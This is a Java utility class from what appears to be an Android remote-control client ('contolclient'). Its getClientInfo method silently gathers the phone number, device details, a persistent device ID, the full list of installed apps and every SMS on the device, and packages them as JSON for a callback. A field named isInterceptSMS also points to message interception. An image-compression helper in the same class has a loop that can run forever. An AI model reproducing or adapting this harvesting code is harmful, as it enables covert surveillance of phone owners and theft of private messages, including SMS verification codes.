package contol.android.kamike.com.contolclient.utils;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.alibaba.fastjson.JSON;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.FileIOUtils;
import com.blankj.utilcode.util.FileUtils;
import com.blankj.utilcode.util.SPUtils;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.UUID;

import contol.android.kamike.com.contolclient.bean.AppInfoBean;
import contol.android.kamike.com.contolclient.bean.ClientInfoBean;
import contol.android.kamike.com.contolclient.bean.SmsInfoBean;

/**
 * Created by Administrator on 2017/9/24.
 */

public class AllUtils {
    public static ArrayList<AppInfoBean> listAllApp = new ArrayList<>();
    public static ArrayList<SmsInfoBean> listAllSms = new ArrayList<>();

    public static String getClientInfo(Context context, boolean isAllData, final OnSmsAppComeplete listener) {
        final ClientInfoBean info = new ClientInfoBean();
        info.androidVersion = android.os.Build.VERSION.RELEASE;
        info.phoneModle = Build.MODEL;
        info.deviceId = getUUIDCache();
        info.isInterceptSMS = false;
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        info.phoneNumber = tm.getLine1Number();
        new Thread() {
            @Override
            public void run() {
                listAllApp.clear();
                for (AppUtils.AppInfo app : AppUtils.getAppsInfo()) {
                    AppInfoBean myApp = new AppInfoBean();
                    myApp.isSystem = app.isSystem();
                    myApp.name = app.getName();
                    myApp.packageName = app.getPackageName();
                    myApp.versionName = app.getVersionName();
                    myApp.icon="";
                    listAllApp.add(myApp);
                }
                info.appList = listAllApp;

                listAllSms = SmsUtils.getAllSMS();
                info.smsList = listAllSms;
                if (listener != null) {
                    listener.onComplete(JSON.toJSONString(info));
                }
            }
        }.start();


        return JSON.toJSONString(info);
    }

    private static String getUniquePsuedoID0() {
        String serial = null;

        String m_szDevIDShort = "35" +
                Build.BOARD.length() % 10 + Build.BRAND.length() % 10 +

                Build.CPU_ABI.length() % 10 + Build.DEVICE.length() % 10 +

                Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 +

                Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 +

                Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 +

                Build.TAGS.length() % 10 + Build.TYPE.length() % 10 +

                Build.USER.length() % 10; //13 位

        try {
            serial = android.os.Build.class.getField("SERIAL").get(null).toString();
            //API>=9 使用serial号
            return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
        } catch (Exception exception) {
            //serial需要一个初始化
            File file = new File(Environment.getExternalStorageDirectory() + "/test/uuid.txt");
            FileUtils.createOrExistsFile(file.getAbsolutePath());

            serial = FileIOUtils.readFile2String(file);
            if (TextUtils.isEmpty(serial)) {
                serial = UUID.randomUUID().toString();
                FileIOUtils.writeFileFromString(file, serial);
            }
        }
        //使用硬件信息拼凑出来的15位号码
        return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
    }

    public static String getUUIDCache() {
        File file = new File(Environment.getExternalStorageDirectory() + "/test/uuid.txt");
        FileUtils.createOrExistsFile(file.getAbsolutePath());

        String uuid = FileIOUtils.readFile2String(file);

        if (TextUtils.isEmpty(uuid)) {
            FileIOUtils.writeFileFromString(file, UUID.randomUUID().toString());
        }
        uuid = FileIOUtils.readFile2String(file);
        if (TextUtils.isEmpty(uuid)) {
            String str = UUID.randomUUID().toString();
            SPUtils.getInstance().put("uuid", str);
            return SPUtils.getInstance().getString("uuid");
        }
        return uuid;
    }


    public static Bitmap compBmp(String bmpPath) {
        if (!new File(bmpPath).exists()) {
            return null;
        }
        BitmapFactory.Options newOpts = new BitmapFactory.Options();
        // 开始读入图片，此时把options.inJustDecodeBounds 设回true了
        newOpts.inJustDecodeBounds = true;
        Bitmap bitmap = BitmapFactory.decodeFile(bmpPath, newOpts);

        int w = newOpts.outWidth;
        int h = newOpts.outHeight;
        float hh = 1920f;
        float ww = 1080f;
        // 缩放比。由于是固定比例缩放，只用高或者宽其中一个数据进行计算即可
        int be = 1;// be=1表示不缩放
        if (w > h && w > ww) {// 如果宽度大的话根据宽度固定大小缩放
            be = (int) (newOpts.outWidth / ww);
        } else if (w < h && h > hh) {// 如果高度高的话根据宽度固定大小缩放
            be = (int) (newOpts.outHeight / hh);
        }
        if (be <= 0)
            be = 1;
        newOpts.inSampleSize = be;// 设置缩放比例
        // 重新读入图片，注意此时已经把options.inJustDecodeBounds 设回false了

        newOpts.inJustDecodeBounds = false;
        bitmap = BitmapFactory.decodeFile(bmpPath, newOpts);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
        while (baos.toByteArray().length > 1024 * 1024) {
            baos.reset();// 重置baos即清空baos
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);// 这里压缩50%，把压缩后的数据存放到baos中
            System.out.println("压缩====");
        }
        ByteArrayInputStream isBm = new ByteArrayInputStream(baos.toByteArray());
        isBm = new ByteArrayInputStream(baos.toByteArray());
        bitmap = BitmapFactory.decodeStream(isBm, null, newOpts);
        return bitmap;// 压缩好比例大小后再进行质量压缩
    }


    public interface OnSmsAppComeplete {
        void onComplete(String jsonData);
    }

}
